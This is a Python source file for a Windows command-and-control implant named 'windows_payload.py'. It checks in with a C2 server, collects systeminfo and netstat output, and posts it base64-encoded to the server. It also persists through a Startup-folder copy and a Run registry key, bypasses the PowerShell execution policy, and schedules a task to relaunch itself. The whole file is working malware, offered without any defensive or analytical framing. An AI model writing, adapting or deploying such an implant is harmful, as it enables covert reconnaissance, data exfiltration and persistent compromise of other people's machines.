import os
import base64
import requests
import subprocess
import sys
import ctypes
import json

C2Server = "http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
AgentID = ""

def encrypt_data(data):
    return base64.b64encode(data.encode()).decode()

def decrypt_data(data):
    return base64.b64decode(data).decode()

def write_log(message, color="white"):
    print(message)

def send_data(endpoint, data):
    data_json = json.dumps(data)
    encrypted_data = encrypt_data(data_json)
    url = f"{C2Server}/{endpoint}"
    response = requests.post(url, data=encrypted_data, headers={"Content-Type": "application/json"})
    write_log(f"Data sent to {endpoint}")
    return response.text

def check_in():
    global AgentID
    write_log("Checking in...")
    response = requests.post(f"{C2Server}/checkin", json={"AgentID": ""}, headers={"Content-Type": "application/json"})
    AgentID = json.loads(response.text)["AgentID"]
    write_log(f"Checked in with AgentID: {AgentID}", "cyan")

def gather_system_info():
    write_log("Gathering system info...")
    return subprocess.check_output("systeminfo", shell=True).decode()

def list_network_connections():
    write_log("Listing network connections...")
    return subprocess.check_output("netstat -an", shell=True).decode()

def establish_persistence():
    write_log("Establishing persistence...")
    script_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_payload.py")
    if not os.path.exists(script_path):
        with open(__file__, 'r') as src, open(script_path, 'w') as dst:
            dst.write(src.read())
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value = "WindowsPayload"
    command = f"python {script_path}"
    os.system(f'reg add HKCU\\{key} /v {value} /t REG_SZ /d "{command}" /f')

def check_execution_policy():
    try:
        subprocess.check_output("powershell -Command Get-ExecutionPolicy", shell=True)
    except subprocess.CalledProcessError:
        write_log("Execution policy is restricted. Attempting to bypass...")
        os.system("powershell -Command Set-ExecutionPolicy Bypass -Scope Process -Force")

def create_scheduled_task():
    write_log("Creating scheduled task...")
    task_name = "ImmediateWindowsPayload"
    task_action = f"powershell.exe -Command Start-Process powershell.exe -ArgumentList '-File {__file__}'"
    task_trigger = "OneTime"
    task_time = "00:00"
    os.system(f'schtasks /create /tn {task_name} /tr "{task_action}" /sc {task_trigger} /st {task_time} /f')

def main():
    write_log("Payload started.")
    
    check_execution_policy()
    check_in()
    system_info = gather_system_info()
    network_connections = list_network_connections()
    
    data = {
        "AgentID": AgentID,
        "SystemInfo": system_info,
        "NetworkConnections": network_connections
    }
    
    write_log("Sending system info and network connections to server.")
    response = send_data("result", data)
    write_log(f"Response from server: {response}", "green")
    establish_persistence()

if __name__ == "__main__":
    main()
    create_scheduled_task()
